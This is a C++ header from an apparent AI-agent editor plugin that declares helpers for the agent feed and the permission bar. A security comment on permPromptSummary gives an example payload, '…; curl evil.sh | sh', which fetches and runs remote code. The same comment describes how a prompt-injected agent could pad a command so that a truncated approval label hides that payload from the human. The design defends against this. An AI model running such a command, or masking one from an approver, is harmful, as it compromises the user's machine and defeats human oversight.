// SPDX-License-Identifier: LGPL-2.0-or-later
// SPDX-FileCopyrightText: 2026 The Agent Kate developers

#pragma once

#include <QByteArray>
#include <QList>
#include <QPair>
#include <QString>

class QJsonObject;
class QJsonValue;
class QWidget;

// Stateless formatting/dispatch helpers split out of AgentPanel. These carry no
// panel state — they map raw stream-json values to the short, human-readable
// strings the feed and the "Agent Kate at work" indicator show — so they live
// here as free functions rather than cluttering the panel translation unit.
namespace agentkate
{
// markdownToHtml renders an assistant message (Markdown) to an HTML fragment.
// Default-coloured text carries no explicit colour, so it inherits the card's
// palette text colour.
QString markdownToHtml(const QString &md);

// permSummary renders a tool's input as a short, human-readable line.
QString permSummary(const QString &toolName, const QJsonObject &input);

// permPromptSummary is permSummary clipped to the permission bar's character
// budget — the line the human reads before pressing Approve.
//
// SECURITY (audit F28): a Bash command is elided in the MIDDLE, not the tail.
// A shell payload hides at the END of the line (`…; curl evil.sh | sh`) and the
// truncation point is attacker-controllable, because padding the front with
// innocuous text is free for a prompt-injected agent. A tail-clipped label then
// shows a benign prefix plus an ellipsis while Approve authorises the whole
// string. Middle elision keeps both ends on screen, so the payload has nowhere
// to hide inside the budget; the bar's Details… view carries the full raw input
// either way. Every other tool keeps tail elision: their summaries are paths,
// URLs and descriptions whose identifying part leads, and the core builds the
// worker-launch prompt facts-first inside this same budget (audit F1) — middle
// elision there would drop the facts and keep the attacker's text.
QString permPromptSummary(const QString &toolName, const QJsonObject &input,
                          int budget);

// toolResultText pulls plain text out of a tool_result content value, which may
// be a bare string or an array of content blocks.
QString toolResultText(const QJsonValue &content);

// toolResultImages pulls base64 image blocks out of a tool_result content
// value (e.g. a screenshot tool's result), decoded, as (mediaType, bytes)
// pairs. Text-only results return an empty list.
QList<QPair<QString, QByteArray>> toolResultImages(const QJsonValue &content);

// activityFor maps a tool name to a personable status line for the
// "Agent Kate at work" indicator.
QString activityFor(const QString &tool);

// resumeStrategyModel maps a configured "Compact on Resume" strategy id to the
// compactNow model it implies, so resume can follow it automatically instead of
// prompting. Returns "" for non-resume strategies (Exit/Stop strategies, or an
// unset/unknown id), in which case the caller falls back to asking.
QString resumeStrategyModel(const QString &strategy);

// askRecoveryModel pops a modal asking which model should produce a missing
// compacted summary before resume. Returns "opus"|"sonnet"|"haiku"|"local",
// or "" if the user cancelled (in which case the caller should resume on the
// full transcript and pay the re-cache cost knowingly).
QString askRecoveryModel(QWidget *parent);

// modelAvailable reports whether a saved model value is still offered for a
// (harnessId, providerId). Returns true when the model is empty (the provider's
// own default), when nothing has been discovered yet (an empty catalogue must
// not trigger a false "unavailable"), or when the value matches a discovered
// entry; false only when a non-empty catalogue genuinely lacks it.
bool modelAvailable(const QString &harnessId, const QString &providerId,
                    const QString &model);

// askReplacementModel pops a modal telling the user a chat's saved model is no
// longer offered by its provider and lets them pick a replacement from the live
// catalogue for (harnessId, providerId). Returns the chosen model value, or ""
// if the user cancelled. oldModel is shown for context.
QString askReplacementModel(QWidget *parent, const QString &harnessId,
                            const QString &providerId, const QString &oldModel);

// --- copy that has to track a state, and must therefore be assertable -------
// These two exist as free functions for the same reason WorktreeCopyTest's
// strings do: a sentence that tells the user what to DO is wrong the moment it
// stops matching the state it describes, and the only way to keep it honest is
// to be able to test it without exec()ing a panel.

// Which of the link's three states a refused send happened in. CoreClient's
// recovery ladder is a real state machine: it climbs for a bounded number of
// rounds and then STOPS, staying dead until the app restarts. Round 1 printed
// "restart to recover" while the ladder was still climbing (telling the user to
// throw away a session that was about to come back); round 2 replaced it with
// an unconditional "reconnecting", which is the same falsehood mirrored — said
// while the banner announced the ladder had given up (audit F50).
enum class LinkState {
    NeverConnected, // no drop has happened; the first connection is not up yet
    Reconnecting,   // the ladder is climbing — waiting is the right advice
    GaveUp,         // the ladder is spent — only a restart recovers
};

// The feed note for a send refused in that state, and the status-bar line that
// accompanies it. Plain text (the caller escapes for the feed).
QString disconnectedSendNote(LinkState state);
QString disconnectedSendStatus(LinkState state);

// The empty-feed hint (audit F44), as an HTML fragment. `isolation` is the
// isolation token the agent is on ("auto" / "isolated" / "workspace") and
// `sendKey` the composer's current send key.
//
// The isolation argument is not decoration: the sentence describes what will
// happen to the user's files, and saying "private copy" to an agent set to
// "Directly in my files" would be exactly the falsehood F30 removed from the
// word "sandbox". It claims no containment either — a worktree separates the
// agent's CHANGES from yours, it does not confine the process.
QString feedEmptyStateHtml(const QString &isolation, const QString &sendKey);
} // namespace agentkate
